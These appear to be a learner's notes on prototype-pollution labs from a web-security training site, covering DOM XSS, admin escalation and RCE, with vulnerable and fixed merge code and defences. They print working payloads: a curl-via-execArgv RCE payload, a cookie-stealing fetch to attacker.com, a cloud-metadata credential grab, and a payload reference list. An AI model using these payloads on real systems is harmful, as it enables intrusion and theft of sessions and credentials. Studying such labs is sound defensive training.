# Day 37 Notes — Prototype Pollution

---

## 1. What We Did Today Overview

- Completed Lab 1: Client-side prototype pollution via browser APIs — confirmed pollution source via `/?__proto__[foo]=bar`, identified gadget using `value` property, triggered XSS via `/?__proto__[value]=data:,alert(1)`
- Completed Lab 2: Server-side prototype pollution → privilege escalation — injected `__proto__` via JSON body in address change endpoint, polluted `isAdmin: true` onto `Object.prototype`, gained admin access
- Studied Lab 3: Server-side prototype pollution → RCE via `constructor.prototype` vector — understood full mechanism without Burp Pro execution
- Studied all three pollution vectors: `__proto__` via URL, `__proto__` via JSON body, `constructor.prototype` via JSON body
- Zero hints used across both executable labs

---

## 2. The Foundation — Why Prototype Pollution Exists

### Part A — Root Cause

JavaScript is a prototype-based language. Every object inherits properties and methods from a **prototype**. The root of this inheritance chain is `Object.prototype` — every single object in a JavaScript application inherits from it.

Every object has a special property called `__proto__` that points to its prototype:

```javascript
let obj = {}
obj.__proto__ === Object.prototype  // true
```

The vulnerability exists when an application **merges user-supplied objects** into application objects without sanitising the keys. If an attacker supplies a key called `__proto__`, the merge function traverses into the prototype instead of the object itself — injecting properties into `Object.prototype`. Since every object inherits from `Object.prototype`, every object in the entire application now has those injected properties.

**The developer's mistake:** using an unsafe recursive merge or deep clone function that processes user-controlled keys without checking if those keys are `__proto__`, `constructor`, or `prototype`.

### Part B — Real World Analogy

A company has a default employee profile template that all employee accounts inherit — it contains `canAccessAdmin: false` by default. Every new account copies from this template.

An attacker finds a form that merges user-submitted JSON into the profile system. They submit:

```json
{"__proto__": {"canAccessAdmin": true}}
```

This modifies the root template itself — not their own profile. Now **every account** in the system inherits `canAccessAdmin: true` — including the attacker's. The developer never imagined someone would try to modify the template rather than their own profile values.

### Part C — Three Conditions Required

1. The application is built with JavaScript — Node.js backend or client-side JS
2. User-controlled data is merged into objects using an unsafe recursive merge function
3. The application reads properties from objects without checking where those properties came from

### Part D — What Prototype Pollution Can and Cannot Do

**Can do:**
- Inject properties that every object in the application inherits — changing application behaviour globally
- Bypass security checks that rely on inherited properties (`isAdmin`, `isVerified`)
- Client-side — achieve XSS by polluting properties used in DOM operations
- Server-side Node.js — achieve RCE via gadget chains in the application's dependencies

**Cannot do:**
- Work in non-JavaScript environments — PHP, Python, Ruby are not affected
- Work if the merge function sanitises `__proto__` and `constructor` keys before processing

### Part E — Real World Context

Prototype pollution has been found in popular npm packages including **lodash, jQuery, and hoek** — affecting millions of applications. CVE-2019-10744 in lodash affected applications using `_.merge()` with user input. HackerOne payouts range from **$500 for basic property injection** to **$10,000+ for RCE via gadget chains**.

### Part F — Three Pollution Vectors Covered Today

| Vector | Syntax | Lab |
|---|---|---|
| `__proto__` via URL parameter | `?__proto__[key]=value` | Lab 1 |
| `__proto__` via JSON body | `{"__proto__": {"key": "value"}}` | Lab 2 |
| `constructor.prototype` via JSON body | `{"constructor": {"prototype": {"key": "value"}}}` | Lab 3 |

All three reach `Object.prototype` — just through different paths. Knowing all three matters because developers often patch `__proto__` but forget `constructor.prototype`.

---

## 3. Lab 1 — Client-Side Prototype Pollution via Browser APIs → DOM XSS

### Lab Name
Client-side prototype pollution via browser APIs

### Vector
`__proto__` via URL query string parameter

### The Injection Point

The URL query string. The application parses URL parameters using a browser API — either `URLSearchParams` combined with a custom merge function, or a third-party URL parsing library — that processes the `__proto__` key without sanitisation and assigns it onto `Object.prototype`.

### Step 1 — Confirming the Pollution Source

Navigated to:

```
https://0a0900a2038d4e1684797d560000001e.web-security-academy.net/?__proto__[foo]=bar
```

Opened browser console (F12) and typed:

```javascript
Object.prototype.foo
```

**Expected return value:** `"bar"`

**What this confirms:** The URL query string parser saw the key `__proto__` and treated it as a prototype traversal rather than a literal key name. It then assigned `foo: "bar"` directly onto `Object.prototype`. Every object created after this point inherits `foo: "bar"` — even objects that never interacted with the URL.

**Why `__proto__[foo]` works in a URL:**

URL query string syntax uses brackets for nested keys. A library like `qs` parses:

```
?user[name]=john
```

into:

```javascript
{ user: { name: "john" } }
```

When the key is `__proto__`:

```
?__proto__[foo]=bar
```

The library parses this as: set the `foo` property on the object at key `__proto__`. But `__proto__` is not a regular key — it is the prototype accessor. So `foo` gets set on `Object.prototype` itself.

### Step 2 — Finding the Gadget

Opened browser developer tools → **Sources** tab → browsed JavaScript files in `/resources/js/`.

The gadget was a piece of application code that read the `value` property from a configuration or options object and used it in a dangerous context — either as a `script src`, `innerHTML`, or `eval` input.

**Gadget pattern found:**

```javascript
// Application reads value property from an object
// Object has no own value property
// Inherits value from Object.prototype via prototype chain
// value is used in a dangerous context — script src, innerHTML, etc.
let config = {};
let script = document.createElement('script');
script.src = config.value;   // config.value inherited from Object.prototype
document.head.appendChild(script);
```

**Why this is a gadget:** `config` is a plain empty object. It has no `value` property of its own. When the application reads `config.value` — JavaScript walks up the prototype chain — finds `value` on `Object.prototype` (which the attacker polluted) — uses it as the script source. The attacker controls what script gets loaded.

### Step 3 — Crafting and Delivering the XSS Payload

Final URL used:

```
https://0a0900a2038d4e1684797d560000001e.web-security-academy.net/?__proto__[value]=data:,alert(1)
```

**Breaking down the payload:**

`?__proto__[value]=data:,alert(1)` means: pollute `Object.prototype.value` with the value `data:,alert(1)`.

**What `data:,alert(1)` is:**

`data:` is a URI scheme that embeds data directly in the URL instead of fetching from a server. The format is:

```
data:[mediatype][;base64],data
```

When `mediatype` is omitted the default is `text/plain`. When a `<script>` tag has a `data:` src, the browser treats the data portion as JavaScript and executes it. So:

```html
<script src="data:,alert(1)"></script>
```

Is equivalent to:

```html
<script>alert(1)</script>
```

**The full chain:**

1. URL loaded → query string parsed → `Object.prototype.value = "data:,alert(1)"`
2. Application creates a `config` object — no `value` property
3. Application reads `config.value` — JavaScript finds it on `Object.prototype` — returns `"data:,alert(1)"`
4. Application sets `script.src = "data:,alert(1)"`
5. Browser loads the data URL as a script — executes `alert(1)`
6. XSS fires — lab solved

### Why This Attack Required No Server

Unlike reflected XSS which needs a server to echo input, this XSS runs entirely via the prototype chain. The server never sees the `__proto__` key or the `data:` payload — everything happens in the victim's browser after the page JavaScript runs. This makes it harder to detect with server-side WAFs.

---

## 4. Lab 2 — Server-Side Prototype Pollution → Privilege Escalation

### Lab Name
Privilege escalation via server-side prototype pollution

### Vector
`__proto__` via JSON request body

### The Injection Point

The address change endpoint — `POST /my-account/change-address`. This endpoint accepts a JSON body, parses it, and merges it into a server-side user preferences object using an unsafe merge function. The merge function does not sanitise `__proto__` — allowing the attacker to inject properties directly onto `Object.prototype` on the Node.js server.

### The Exact Request Sent

```http
POST /my-account/change-address HTTP/2
Host: 0a4100d504fac1a680c49e02007b00c5.web-security-academy.net
Cookie: session=n7Dt3PvmUrMDIBeiZ6L0WesWsT7UK2q0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Content-Length: 203
Origin: https://0a4100d504fac1a680c49e02007b00c5.web-security-academy.net
Referer: https://0a4100d504fac1a680c49e02007b00c5.web-security-academy.net/my-account?id=wiener

{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "n7Dt3PvmUrMDIBeiZ6L0WesWsT7UK2q0",
    "__proto__": {
        "isAdmin": true
    }
}
```

### What the Payload Does — Line by Line

**The legitimate fields:**
`address_line_1`, `address_line_2`, `city`, `postcode`, `country`, `sessionId` — these are the normal address fields the endpoint expects. They are included to make the request look legitimate and to avoid triggering validation errors that might prevent the body from being processed.

**`"__proto__": {"isAdmin": true}`**
This is the injection. When the server's merge function processes this JSON it encounters the key `__proto__`. Instead of treating it as a regular property named `__proto__`, the unsafe merge function traverses into the prototype. It then assigns `isAdmin: true` onto `Object.prototype` on the Node.js server.

**After this request:**
Every plain JavaScript object on the server inherits `isAdmin: true` — including user session objects, request context objects, and any object the application creates to represent the current user. When the application checks `user.isAdmin` — it finds `true` — not because the user is actually an admin, but because `Object.prototype.isAdmin` is now `true` and the property is inherited.

### How Admin Access Was Achieved

After sending the polluted request — navigated to `/admin` in the browser. The admin panel became accessible because the server-side access check reads `isAdmin` from the user object — which now inherits `true` from the polluted `Object.prototype`.

**The access check the server runs (conceptually):**

```javascript
// Server-side check
function isAdminUser(user) {
    return user.isAdmin;  // user has no own isAdmin property
                          // inherits true from Object.prototype
                          // returns true for every user
}
```

**Why every user becomes admin:**
`Object.prototype` is shared across the entire Node.js process. Polluting it affects every object — not just the attacker's user object. Every user making requests to the server during this window would also have admin access if their session objects are checked the same way.

### Why This Is Dangerous Beyond Just One Account

In a real application this would mean:
- Every active user session temporarily gains admin privileges
- All admin actions (user deletion, data export, config changes) become available to everyone
- The pollution persists until the Node.js process restarts or the affected property is removed
- An attacker can make destructive admin changes, export all user data, or create a backdoor admin account before the pollution clears

---

## 5. Lab 3 — Server-Side Prototype Pollution → RCE via constructor.prototype

### Lab Name
Remote code execution via server-side prototype pollution

### Vector
`constructor.prototype` via JSON body — bypasses `__proto__` sanitisation

### Why This Vector Exists

Every JavaScript object has a `constructor` property that points to the function used to create it. That function has a `prototype` property. So:

```javascript
let obj = {}
obj.constructor === Object          // true
obj.constructor.prototype === Object.prototype  // true
```

This means `obj.constructor.prototype` and `obj.__proto__` point to the **same object** — `Object.prototype`. Modifying either one modifies the same prototype.

Many developers who patch prototype pollution only add a check for `__proto__`:

```javascript
// Partially fixed — still vulnerable
if (key === '__proto__') continue;
```

But forget that `constructor.prototype` reaches the same target. The `constructor.prototype` vector bypasses this partial fix entirely.

### The Confirmation Payload

```json
{
    "username": "wiener",
    "constructor": {
        "prototype": {
            "foo": "bar"
        }
    }
}
```

**What happens:**
1. Merge function iterates keys — encounters `constructor`
2. `constructor` is not blocked (only `__proto__` was blocked)
3. Recurses into `target.constructor` — which is the `Object` constructor function
4. Encounters key `prototype` — recurses into `target.constructor.prototype` — which is `Object.prototype`
5. Assigns `foo: "bar"` onto `Object.prototype`
6. Identical end result to the `__proto__` vector — just a different path

**Expected response:** `"foo": "bar"` appears in the JSON response — confirming `Object.prototype` was polluted and the property was serialised back.

### The RCE Payload

```json
{
    "username": "wiener",
    "constructor": {
        "prototype": {
            "execArgv": [
                "--eval=process.mainModule.require('child_process').execSync('curl https://YOUR-COLLABORATOR-URL')"
            ]
        }
    }
}
```

### The RCE Payload — Broken Down Completely

**`"execArgv"`**
`execArgv` is a Node.js process option that specifies additional command-line arguments passed to the Node.js executable when spawning a child process. Normally it is set per-spawn call in the options object. When `Object.prototype.execArgv` is polluted — every options object passed to any `child_process` function inherits this array — causing every child process spawn to include these arguments.

**`"--eval=..."`**
The `--eval` flag tells the Node.js executable to evaluate a string of JavaScript code before running any script file. When a child process is spawned with `--eval=<code>` in its `execArgv` — Node.js executes `<code>` immediately on startup — before doing anything else.

**`process.mainModule.require('child_process')`**
Inside the eval'd code — `process.mainModule` is the main module of the Node.js process. `.require('child_process')` loads the built-in `child_process` module — which provides functions for executing system commands.

**`execSync('curl https://YOUR-COLLABORATOR-URL')`**
`execSync` runs a shell command synchronously and returns its output. Here it runs `curl` to make an HTTP request to the Collaborator URL. This outbound request proves the injected code executed on the server.

**The full execution chain:**

```
Attacker sends JSON with constructor.prototype.execArgv polluted
        ↓
Object.prototype.execArgv = ["--eval=...curl attacker.com..."]
        ↓
Application triggers any child_process.spawn() call
(job runner, file processor, report generator — any background task)
        ↓
Node.js creates a new process — reads execArgv from options object
Options object has no own execArgv → inherits from Object.prototype
execArgv = ["--eval=require('child_process').execSync('curl attacker.com')"]
        ↓
New Node.js process starts with --eval flag
Immediately executes: require('child_process').execSync('curl attacker.com')
        ↓
Server makes HTTP request to Collaborator URL
Collaborator records DNS lookup + HTTP interaction
        ↓
RCE confirmed — attacker controls what code runs in the child process
```

### What Collaborator Would Show (Burp Pro)

```
DNS Query
  From: [target-server-IP]
  To: YOUR-COLLABORATOR-URL
  Type: A

HTTP Request
  From: [target-server-IP]
  Method: GET
  URL: https://YOUR-COLLABORATOR-URL
  Headers: User-Agent: curl/7.x.x
```

The DNS lookup and HTTP GET from the target server's IP address prove the `curl` command executed — confirming the `--eval` code ran inside the spawned Node.js child process.

### Alternative Without Burp Pro

Use `interactsh` — a free open-source out-of-band interaction tool:

```bash
# Install interactsh client
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start listener — generates a unique URL
interactsh-client

# Use the generated URL in the payload instead of Collaborator URL
```

Or write output to a readable file:

```json
{
    "constructor": {
        "prototype": {
            "execArgv": [
                "--eval=process.mainModule.require('child_process').execSync('id > /tmp/rce_proof.txt')"
            ]
        }
    }
}
```

Then attempt to read `/tmp/rce_proof.txt` via path traversal or another endpoint that serves files.

---

## 6. Vulnerable Source Code — Line by Line

### The Vulnerable Merge Function

```javascript
// Vulnerable recursive merge — used in Labs 1 and 2
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Called with user-supplied data
const userInput = JSON.parse(req.body);
const settings = merge({}, userInput);
```

**`for (let key in source)`**
Iterates all enumerable keys in the source object. `for...in` does not filter `__proto__` or `constructor`. If the attacker's object has `__proto__` as a key — this loop processes it.

**`merge(target[key], source[key])`**
When `key` is `__proto__`: `target[key]` resolves to `target.__proto__` which is `Object.prototype`. The function recurses — now merging the attacker's payload directly into `Object.prototype`.

When `key` is `constructor` and the nested key is `prototype`: the function recurses into `target.constructor` (the Object constructor function) then into its `prototype` — reaching `Object.prototype` via a different path.

**`target[key] = source[key]`**
For non-object values — assigns directly. If the resolved target is `Object.prototype` — the attacker's property is now on the prototype.

### Why `constructor.prototype` Bypasses Partial Fixes

```javascript
// Partial fix — only blocks __proto__
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__') continue;  // Only this blocked
        // constructor.prototype still works — not blocked
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

`{"constructor": {"prototype": {"isAdmin": true}}}` — the key `constructor` is not blocked. The function recurses into `target.constructor` (the Object function), then processes the key `prototype` — recurses into `target.constructor.prototype` which IS `Object.prototype`. Identical end result.

### The Fully Fixed Merge Function

```javascript
// Fully fixed — blocks all three pollution vectors
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // Skip all three — none of these should ever be user-controlled keys
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**Why blocking `prototype` is also needed:** If the merge target is a function object, `target.prototype` is that function's prototype. Blocking `prototype` as a standalone key prevents this vector too.

---

## 7. What Failed and Why

Nothing failed today. Both executable labs solved without hints.

**Observation from Lab 1 — `__proto__` vs `proto` in the URL:**
The confirmation test used `/?__proto__[foo]=bar` — double underscores. The final XSS payload used `/?__proto__[value]=data:,alert(1)` — also double underscores. Both are the same vector. Some URL parsers also process `__proto__` written as `__proto__` — always test with double underscores first.

**Observation from Lab 2 — pollution scope:**
Once `Object.prototype.isAdmin = true` is set on the server — it affects every user for the lifetime of the Node.js process. This is a side effect that would cause issues in real testing — you are effectively granting admin to all users, not just yourself. In a real bug bounty environment always note this in the report and request a private test instance.

---

## 8. Chain Thinking

### Chain 1 — Client-Side: URL Pollution → XSS → Session Hijacking

```
Attacker crafts malicious URL:
?__proto__[transport_url]=https://attacker.com/steal.js
        ↓
Victim clicks the link
Browser parses URL → vulnerable merge processes __proto__
Object.prototype.transport_url = "https://attacker.com/steal.js"
        ↓
Application JS reads transport_url from config object
config has no own transport_url → inherits from Object.prototype
        ↓
Application creates: <script src="https://attacker.com/steal.js">
steal.js executes in victim's browser
        ↓
steal.js: fetch('https://attacker.com/?c=' + document.cookie)
        ↓
Session cookie sent to attacker → account takeover
```

### Chain 2 — Server-Side: JSON Pollution → Privilege Escalation → Admin → Webshell → RCE

```
JSON merge endpoint found on Node.js server
        ↓
Inject: {"__proto__": {"isAdmin": true}}
Object.prototype.isAdmin = true on the server
        ↓
Every user object inherits isAdmin: true
Admin panel /admin becomes accessible
        ↓
Admin panel has file upload or template editor
        ↓
Upload PHP/Node webshell via admin feature
        ↓
RCE achieved → full server compromise
```

### Chain 3 — constructor.prototype Bypass → RCE → Cloud Credentials

```
Developer patched __proto__ but forgot constructor.prototype
        ↓
Inject via constructor.prototype:
{"constructor": {"prototype": {"execArgv": ["--eval=...curl attacker.com..."]}}}
        ↓
Object.prototype.execArgv polluted
Any child_process.spawn() in the app inherits execArgv
        ↓
Node.js spawns child with --eval flag → attacker code runs
        ↓
curl http://169.254.169.254/.../iam/security-credentials/role
        ↓
AWS IAM credentials exfiltrated via RCE
Full cloud infrastructure access
```

### Severity Table

| Finding | Severity | Reason |
|---|---|---|
| Client-side pollution confirmed, no gadget | Low/Medium | Confirmed but no impact yet |
| Client-side pollution + XSS gadget found | High | Exploitable via crafted URL link |
| Server-side pollution + privilege escalation | High | Admin access without credentials |
| constructor.prototype bypass found | High+ | Partial fix bypassed — full patch needed |
| Server-side pollution + RCE via gadget | Critical | Full server compromise |

---

## 9. Real World Context

**lodash CVE-2019-10744:** The `_.merge()` function in lodash was vulnerable to prototype pollution via `__proto__`. Applications using `_.merge(obj, userInput)` with untrusted input were affected. Lodash is one of the most downloaded npm packages — this affected millions of Node.js applications. Fixed in version 4.17.21.

**jQuery CVE-2019-11358:** `jQuery.extend()` with deep merge was vulnerable. Any jQuery application using `$.extend(true, {}, userInput)` could be exploited. Fixed in jQuery 3.4.0.

**hoek (hapi.js):** The `hoek.merge()` utility used internally by the hapi framework was vulnerable. Any application built on hapi that passed user input through hoek's merge was affected.

**Bug bounty approach:**
- Target: any JavaScript application — client-side or Node.js
- Client-side: test `?__proto__[testproperty]=testvalue` on every page → check `Object.prototype` in console
- Server-side: add `"__proto__": {"testproperty": "testvalue"}` to every JSON body → check if `testproperty` appears in responses
- If `__proto__` is blocked: try `{"constructor": {"prototype": {"testproperty": "testvalue"}}}`
- If pollution confirmed: hunt for gadgets in JS source (client-side) or known Node.js gadget chains (server-side)

---

## 10. The Fix

### Defense in Depth

1. **Sanitise all merge/clone functions** — block `__proto__`, `constructor`, and `prototype` keys explicitly before any recursion
2. **Use `Object.create(null)`** — creates an object with NO prototype — polluting it does not affect `Object.prototype`
3. **Use `JSON.parse()` with a reviver function** — filter dangerous keys during parsing before they reach any merge function:

```javascript
const safe = JSON.parse(userInput, (key, value) => {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        return undefined;  // Drop the key entirely
    }
    return value;
});
```

4. **Freeze `Object.prototype`** — prevents any modifications:

```javascript
Object.freeze(Object.prototype);
```

Note: this may break some third-party libraries that legitimately extend prototypes — test carefully.

5. **Keep dependencies updated** — lodash, jQuery, and most major libraries have patched prototype pollution — always use current versions

### What Does NOT Fix Prototype Pollution

- Blocking `__proto__` alone — `constructor.prototype` reaches the same target
- Input validation on final values — the prototype is polluted during merging, before validation runs
- HTTPS/TLS — the payload is in the JSON body or URL, encryption does not affect how the server parses it
- Sanitising output — the prototype is already polluted; sanitising what gets displayed does not remove the polluted property

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| Prototype | An object that other objects inherit properties from |
| `Object.prototype` | The root prototype — every JavaScript object ultimately inherits from it |
| `__proto__` | Special property on every object that points to its prototype |
| `constructor` | Property on every object pointing to the function that created it |
| `constructor.prototype` | Alternative path to `Object.prototype` — same target as `__proto__` |
| Prototype pollution | Injecting properties onto `Object.prototype` via unsafe merge/clone operations |
| Source | The location where user input enters the prototype chain (URL param, JSON body) |
| Gadget | Existing application code that reads an inherited property and uses it dangerously |
| `for...in` | JavaScript loop that iterates all enumerable keys including prototype chain keys |
| `execArgv` | Node.js process option — extra args passed to the Node executable when spawning children |
| `--eval` | Node.js flag — executes a string of JavaScript code on process startup |
| `data:` URI | URI scheme that embeds data directly — `data:,alert(1)` executes as JS in a script tag |
| `Object.create(null)` | Creates an object with no prototype — immune to prototype pollution effects |
| `Object.freeze()` | Prevents any modifications to an object — can lock `Object.prototype` |

---

## 12. Payloads Reference

### Client-Side — URL Vector

```
# Confirm pollution source
/?__proto__[testproperty]=testvalue
→ Check Object.prototype.testproperty in browser console → should return "testvalue"

# XSS via script src gadget
/?__proto__[transport_url]=data:,alert(1)

# XSS via innerHTML gadget
/?__proto__[innerHTML]=<img src=1 onerror=alert(1)>

# XSS via eval gadget
/?__proto__[callback]=alert(1)

# Lab 1 solution
/?__proto__[value]=data:,alert(1)
```

### Server-Side — JSON Body via `__proto__`

```json
// Confirm pollution
{
    "__proto__": {
        "testproperty": "testvalue"
    }
}

// Privilege escalation
{
    "__proto__": {
        "isAdmin": true
    }
}

// Alternative admin property names to try
{
    "__proto__": {"admin": true}
}
{
    "__proto__": {"role": "admin"}
}
{
    "__proto__": {"isAdmin": 1}
}

// Lab 2 solution — full request body
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "n7Dt3PvmUrMDIBeiZ6L0WesWsT7UK2q0",
    "__proto__": {
        "isAdmin": true
    }
}
```

### Server-Side — JSON Body via `constructor.prototype`

```json
// Confirm pollution (bypasses __proto__ block)
{
    "constructor": {
        "prototype": {
            "testproperty": "testvalue"
        }
    }
}

// Privilege escalation via constructor.prototype
{
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
}

// RCE via execArgv gadget (requires Burp Pro Collaborator or interactsh)
{
    "constructor": {
        "prototype": {
            "execArgv": [
                "--eval=process.mainModule.require('child_process').execSync('curl https://YOUR-COLLABORATOR-URL')"
            ]
        }
    }
}

// RCE — write output to file (Community Edition alternative)
{
    "constructor": {
        "prototype": {
            "execArgv": [
                "--eval=process.mainModule.require('child_process').execSync('id > /tmp/rce_proof.txt')"
            ]
        }
    }
}
```

---

## 13. Foundation Checklist

1. **What is `Object.prototype` and why does polluting it affect every object in the JavaScript application?**
   `Object.prototype` is the root of JavaScript's prototype chain — every plain object ultimately inherits from it. When you read a property from an object, JavaScript first checks the object's own properties, then walks up the prototype chain. If `Object.prototype` has been polluted with `isAdmin: true`, every object that doesn't have its own `isAdmin` property will find `true` when that property is read — regardless of what the object is or who created it.

2. **What is the difference between a pollution source and a pollution gadget?**
   A **source** is where user input enters the prototype chain — the URL query string parser in Lab 1, the JSON body merge function in Lab 2. A **gadget** is existing application code that reads an inherited property and uses it dangerously — in Lab 1 the gadget was the code that read `config.value` and used it as a script `src`. The source and gadget are always separate — finding one without the other gives you no impact.

3. **You confirm `__proto__` pollution via URL in Lab 1. `Object.prototype` has your test property. But XSS doesn't fire. What do you look for next?**
   Look for a gadget — browse the JS source files in the Sources tab. Find code that reads a property from a plain object and uses it in a dangerous context (`innerHTML`, `script.src`, `eval`, `document.write`). Identify the exact property name that is read. Then pollute that specific property name with an appropriate XSS payload. The gadget is what converts the pollution into impact.

4. **In the vulnerable merge function — which specific line causes the prototype to be polluted when the key is `__proto__`, and why?**
   The line `merge(target[key], source[key])` — when `key` is `__proto__`, `target[key]` resolves to `target.__proto__` which is `Object.prototype`. The function recursively merges the attacker's payload directly into `Object.prototype`. The `for...in` loop does not filter `__proto__` — it processes it as a regular key — allowing traversal into the prototype.

5. **A developer patches prototype pollution by blocking `__proto__`. Why is this insufficient?**
   Because `constructor.prototype` reaches the exact same target — `Object.prototype` — via a different path. `obj.constructor` is the Object constructor function. `obj.constructor.prototype` is `Object.prototype`. If the merge function only skips `__proto__` but processes `constructor` normally — an attacker can use `{"constructor": {"prototype": {"isAdmin": true}}}` to achieve the identical result. All three keys must be blocked: `__proto__`, `constructor`, and `prototype`.

6. **Why does the `execArgv` gadget lead to RCE and what specifically causes Node.js to execute the injected code?**
   `execArgv` is the array of Node.js command-line arguments passed to the Node executable when spawning child processes. When `Object.prototype.execArgv` is polluted, every options object passed to `child_process.spawn()` inherits this array — because options objects are plain objects with no own `execArgv` property. Node.js reads `execArgv` from the options and passes `--eval=<code>` to the new Node.js process. The `--eval` flag causes Node.js to execute the injected string as JavaScript immediately on startup — before running any intended script. The injected code runs `execSync('curl attacker.com')` — proving arbitrary command execution.

---
